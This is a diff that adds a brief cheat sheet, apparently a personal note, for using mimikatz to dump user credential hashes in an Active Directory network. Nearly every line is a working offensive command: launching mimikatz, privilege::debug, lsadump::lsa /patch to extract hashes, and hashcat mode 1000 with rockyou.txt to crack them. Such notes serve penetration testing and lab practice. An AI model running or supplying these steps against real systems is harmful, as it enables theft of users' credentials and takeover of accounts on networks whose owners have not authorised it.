@@ -1,0 +1,14 @@
+mimikatz - post-exploitation tool most commonly used for dumping user credentials 
+inside of an active directory network
+Source: https://github.com/ParrotSec/mimikatz
+
+##################### Dumping hashes #####################
+Commands:
+cd Downloads && mimikatz.exe
+                  Run mimikatz
+privilege::debug
+                  Ensure that the output is "Privilege '20' ok" -
+lsadump::lsa /patch
+                  Dump hashes
+hashcat -m 1000 <HASH> rockyou.txt
+                  Crack hashes
